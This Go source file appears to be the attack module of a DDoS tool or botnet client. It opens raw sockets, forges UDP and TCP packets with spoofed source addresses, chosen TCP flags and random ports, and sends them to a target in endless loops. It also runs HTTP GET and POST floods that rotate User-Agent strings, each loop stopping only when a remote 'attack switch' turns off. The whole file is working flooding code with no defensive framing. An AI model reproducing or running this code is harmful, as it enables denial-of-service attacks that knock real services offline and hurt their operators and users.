package lib

import (
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"os"
	"strconv"
	"syscall"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

func sockBuffer(size string) []byte {
	iSize := convInt(size)
	if iSize < 10 || iSize > 1400 {
		iSize = 100
	}
	return make([]byte, iSize)
}

func rawSocket(rawProtocol int) net.PacketConn {
	sock, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, rawProtocol)
	syscall.SetsockoptInt(sock, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)
	syscall.SetsockoptInt(sock, syscall.IPPROTO_IP, syscall.SO_REUSEADDR, 1)
	conn, _ := net.FilePacketConn(os.NewFile(uintptr(sock), fmt.Sprint(sock)))
	return conn
}

func setupOpt() (gopacket.SerializeBuffer, *gopacket.SerializeOptions) {
	buffer := gopacket.NewSerializeBuffer()
	opts := &gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}
	return buffer, opts
}

func setupIPv4(srcv4, dstv4 net.IP, protov4 layers.IPProtocol) *layers.IPv4 {
	ipv4 := &layers.IPv4{
		SrcIP:    srcv4,
		DstIP:    dstv4,
		Version:  4,
		TTL:      255,
		Protocol: protov4,
	}
	return ipv4
}

func (a *Attack) setupUDP(udpSrc, udpDst *net.UDPAddr) []byte {
	sBuffer, sOpt := setupOpt()
	udpv4 := setupIPv4(udpSrc.IP.To4(), udpDst.IP.To4(), layers.IPProtocolUDP)
	udpLayers := &layers.UDP{
		SrcPort: layers.UDPPort(udpSrc.Port),
		DstPort: layers.UDPPort(udpDst.Port),
	}
	udpLayers.SetNetworkLayerForChecksum(udpv4)
	gopacket.SerializeLayers(sBuffer, *sOpt, udpv4, udpLayers, gopacket.Payload(a.ddosPayload))
	return sBuffer.Bytes()
}

func (a *Attack) setupTCP(tcpSrc, tcpDst *net.TCPAddr) []byte {
	sBuffer, sOpt := setupOpt()
	tcpv4 := setupIPv4(tcpSrc.IP.To4(), tcpDst.IP.To4(), layers.IPProtocolTCP)
	setWin, _ := strconv.ParseUint(genRange(65535, 25), 0, 16)
	tcpLayers := &layers.TCP{
		SrcPort: layers.TCPPort(tcpSrc.Port),
		DstPort: layers.TCPPort(tcpDst.Port),
		Window:  uint16(setWin),
		SYN:     a.synFlag,
		ACK:     a.ackFlag,
		RST:     a.rstFlag,
		PSH:     a.pshFlag,
		FIN:     a.finFlag,
		URG:     a.urgFlag,
	}
	tcpLayers.SetNetworkLayerForChecksum(tcpv4)
	gopacket.SerializeLayers(sBuffer, *sOpt, tcpv4, tcpLayers, gopacket.Payload(a.ddosPayload))
	return sBuffer.Bytes()
}

func (a *Attack) randDstPort() int {
	if a.dstPort == "-r" {
		return rand.Intn(65535)
	}
	return convInt(a.dstPort)
}

func (a *Attack) setupHTTP() (*http.Client, *http.Request) {
	httpReq, _ := http.NewRequest(a.httpMethod, a.url+"/"+a.reqHeader, nil)
	return &http.Client{}, httpReq
}

func (a *Attack) getRequest() {
	get, usrAgent := a.setupHTTP()
	for {
		for agent := range httpAgent {
			usrAgent.Header.Set("User-Agent", httpAgent[agent])
			get.Do(usrAgent)
			if callSwitch, keySwitch := SetupCaller(); keySwitch {
				if callSwitch.CallAttack.attackSwitch {
					break
				}
			}
		}
		if callSwitch, keySwitch := SetupCaller(); keySwitch {
			if callSwitch.CallAttack.attackSwitch {
				break
			}
		}
	}
}

func (a *Attack) postRequest() {
	post, postBody := a.setupHTTP()
	for {
		post.Do(postBody)
		if callSwitch, keySwitch := SetupCaller(); keySwitch {
			if callSwitch.CallAttack.attackSwitch {
				break
			}
		}
	}
}

func (a *Attack) udpPacket() {
	conn := rawSocket(syscall.IPPROTO_UDP)
	for {
		/*
			Setup UDP dst.
		*/
		dst := &net.UDPAddr{
			IP:   net.ParseIP(a.dstAddr),
			Port: a.randDstPort(),
		}
		/*
			Setup UDP src.
		*/
		udp := a.setupUDP(
			&net.UDPAddr{
				IP:   net.ParseIP(a.srcAddr),
				Port: rand.Intn(65535),
			}, dst)
		/*
			Send UDP packet.
		*/
		conn.WriteTo(udp,
			&net.IPAddr{
				IP: dst.IP,
			},
		)
		if callSwitch, keySwitch := SetupCaller(); keySwitch {
			if callSwitch.CallAttack.attackSwitch {
				break
			}
		}
	}
}

func (a *Attack) tcpPacket() {
	conn := rawSocket(syscall.IPPROTO_TCP)
	for {
		/*
			Setup TCP dst.
		*/
		dst := &net.TCPAddr{
			IP:   net.ParseIP(a.dstAddr),
			Port: a.randDstPort(),
		}
		/*
			Setup TCP src.
		*/
		tcp := a.setupTCP(
			&net.TCPAddr{
				IP:   net.ParseIP(a.srcAddr),
				Port: rand.Intn(65535),
			}, dst)
		/*
			Send TCP packet.
		*/
		conn.WriteTo(tcp,
			&net.IPAddr{
				IP: dst.IP,
			},
		)
		if callSwitch, keySwitch := SetupCaller(); keySwitch {
			if callSwitch.CallAttack.attackSwitch {
				break
			}
		}
	}
}
